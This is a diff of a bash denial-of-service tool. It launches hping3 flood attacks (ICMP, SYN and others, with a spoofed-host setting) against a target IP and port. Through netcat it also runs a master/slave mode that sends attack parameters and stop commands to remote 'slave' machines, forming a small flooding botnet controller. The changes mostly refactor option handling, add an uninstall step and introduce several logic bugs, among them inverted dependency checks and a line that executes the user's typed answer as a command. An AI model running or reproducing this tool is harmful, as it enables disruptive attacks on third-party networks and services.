@@ -1,13 +1,13 @@
 #!/bin/bash
-if [ "$1" = "Install" ] || [ "$1" = "install" ]; then
+if [ `echo $1 | tr [:upper:] [:lower:]` = "install" ]; then
     if [ ! -d ~/.dos_history/ ]; then
         mkdir ~/.dos_history/
         echo "Couldn't find ${HOME}/.dos_history, attempting to create it."
     else
         echo "Found ${HOME}/.dos_history"
     fi
-    DIALOG_VER=`dialog -v | sed -n 1p | awk '{printf $5}' | cut -f1 -d'-'`
-    if [ "${DIALOG_VER}" != "" ]; then
+    DIALOG_VER=`whereis dialog | awk '{printf $2}'`
+    if [ ! "${DIALOG_VER}" ]; then
         echo "Found dialog"
     else
         echo "dialog does not appear to be installed."
@@ -23,8 +23,8 @@ Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
     else
         echo "Found ${HOME}/.dos_history/.last_dos"
     fi
-    HPING3_TEST=`hping3 -v | sed -n 1p | awk '{printf $1}'`
-    if [ "${HPING3_TEST}" != "" ]; then
+    HPING3_TEST=`whereis hping3 | awk '{printf $2}'`
+    if [ ! "${HPING3_TEST}" ]; then
         echo "Found hping3"
     else
         echo "hping3 does not appear to be installed."
@@ -33,9 +33,25 @@ Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
     echo "Would you like to continue?"
     printf "[Y/N] [Y]: "
     read ANSWER
-    if [ "${ANSWER}" = "N" ] || [ "${ANSWER}" = "n" ]; then
+    if [ `${ANSWER} | tr [:upper:] [:lower:]` = "n" ]; then
         exit 0
     fi
+elif [ `echo $1 | tr [:upper:] [:lower:]` = "remove" ]; then
+    if [ -d ~/.dos_history/ ]; then
+        echo "Found ~/.dos_history/, removing."
+        rm -rf ~/.dos_history/
+        if [ -d ~/.dos_history/ ]; then
+            echo "For some reason ~/.dos_history/ still exists, investigate this."
+        fi
+    elif [ -e /tmp/dos.tmp ]; then
+        echo "Found /tmp/dos.tmp, this shouldn't be here but removing anyway."
+        rm -f /tmp/dos.tmp
+        if [ -e /tmp/dos.tmp ]; then
+            echo "For some reason /tmp/dos.tmp still exists, investigate this."
+        fi
+    fi
+    echo "Files removed. You can remove $0 now."
+    exit 0
 fi
 function dos_history {
 LAST_IP=`grep -w 'Last_IP:' $1 | awk '{printf $2}'`
@@ -89,32 +105,33 @@ elif [ ${PROTOCOL} = SYN ]; then
 elif [ ${PROTOCOL} = ICMP ]; then
     hping3 --icmp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
 fi
-exit 0
 }
 function master {
     while read p; do
-    SLAVE_IP=`echo ${p} | awk '{printf $1}'`
+    SLAVE[1]=`echo ${p} | awk '{printf $1}'`
 #    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
-    SLAVE_DAEMON_PORT=`echo ${p} | awk '{printf $2}'`
-    SLAVE_PASSPHRASE=`echo ${p} | awk '{printf $3}'`
+    SLAVE[2]=`echo ${p} | awk '{printf $2}'`
+    SLAVE[3]=`echo ${p} | awk '{printf $3}'`
     echo "Putting slave into listen state"
-    echo "listen start ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_DAEMON_PORT}
+    echo "listen start ${SLAVE[3]}" | nc ${SLAVE[1]} ${SLAVE[2]}
     sleep 0.5
     # For this bit, thank Stackoverflow
     # Very messy but it'll have to do :(
     DOS_SESSION_FILE=`cat ${DOS_SESSION}`
-    cat ${DOS_SESSION} | nc ${SLAVE_IP} ${SLAVE_DAEMON_PORT}
+    cat ${DOS_SESSION} | nc ${SLAVE[1]} ${SLAVE[2]}
     #echo -e "${DOS_SESSION_FILE}\nPassphrase: ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_PORT}
-    echo "Sent attack details to ${SLAVE_IP} on port ${SLAVE_DAEMON_PORT}"
+    echo "Sent attack details to ${SLAVE[1]} on port ${SLAVE[2]}"
     done < .ip_list
     }
 #No GUI, derive parameters from the history.
-if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
+if [ `echo $1 | tr [:upper:] [:lower:]` = "unattended" ]; then
     func_history
-elif [ "$1" = "History" ] || [ "$1" = "history" ]; then
+    exit 0
+elif [ `echo $1 | tr [:upper:] [:lower:]` = "history" ]; then
     if [ -e $2 ]; then
         dos_history $2
         func_history
+        rm -f $2
     elif [ ! -e $2 ]; then
         echo "$2: file not found"
         exit 1
@@ -126,10 +143,11 @@ elif [ "$1" = "History" ] || [ "$1" = "history" ]; then
             dos_history ${DOS_SESSION}
             func_history
             cd ${LAST_DIR}
+            exit 0
         done
     fi
 #7:58PM 13/01/2012
-elif [ "$1" = "master" ] || [ "$1" = "Master" ]; then
+elif [ `echo $1 | tr [:upper:] [:lower:]` = "master" ]; then
     echo "Add IPs to ~/.dos_history/.ip_list where the IP is first on the line and port is second."
     echo "Select the attack to perform:"
     cd ~/.dos_history
@@ -145,20 +163,20 @@ elif [ "$1" = "master" ] || [ "$1" = "Master" ]; then
     #fi
     exit 0
     done
-elif [ "$1" = "stop" ] || [  "$1" = "Stop" ]; then
+elif [ `echo $1 | tr [:upper:] [:lower:]` = "stop" ]; then
     echo "Make sure a third field is in ~/.dos_history/.ip_list and a daemon running on the machine."
     cd ~/.dos_history
     while read p; do
-    SLAVE_IP=`echo ${p} | awk '{printf $1}'`
-    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
-    SLAVE_PASSPHRASE=`echo ${p} | awk '{printf $3}'`
-    echo "stop hping3 ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_PORT}
-    echo "Sent stop packet to ${SLAVE_IP} on port ${SLAVE_PORT}"
+    SLAVE_INFO[1]=`echo ${p} | awk '{printf $1}'`
+    SLAVE_INFO[2]=`echo ${p} | awk '{printf $2}'`
+    SLAVE_INFO[3]=`echo ${p} | awk '{printf $3}'`
+    echo "stop hping3 ${SLAVE_INFO[3]}" | nc ${SLAVE_INFO[1]} ${SLAVE_INFO[2]}
+    echo "Sent stop packet to ${SLAVE_INFO[1]} on port ${SLAVE_INFO[2]}"
     done < .ip_list
     exit 0
-elif [ "$1" = "add" ] || [ "$1" = "Add" ]; then
+elif [ `echo $1 | tr [:upper:] [:lower:]` = "add" ]; then
     SLAVE_INFO[1]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave IP" 8 40 --stdout`
-    SLAVE_INFO[2]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Control Daemon Port" 8 40 112 --stdout`
+    SLAVE_INFO[2]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Control Daemon Port" 8 40 100 --stdout`
     SLAVE_INFO[3]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave Passphrase" 8 40 default --stdout`
     echo "Adding ${SLAVE_INFO[1]} with the port and daemon port ${SLAVE_INFO[2]} to ~/.dos_history/.ip_list"
     echo "${SLAVE_INFO[1]} ${SLAVE_INFO[2]}" "${SLAVE_INFO[3]}" >> ~/.dos_history/.ip_list
@@ -182,9 +200,8 @@ function main {
     if [ "${PAYLOAD_SIZE}" -gt 1500 ]; then
         dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --ok-label "Continue anyway" --msgbox "Warning: Most routers will drop packets that are larger than 1500 bytes." 5 80
     fi
-    DATE=`date`
 #No indents here as it didn't work with them.
-echo "Generated ${DATE}
+echo "Generated `date`
 Last_IP: ${IP}
 Last_Port: ${PORT}
 Last_Protocol: ${opt}
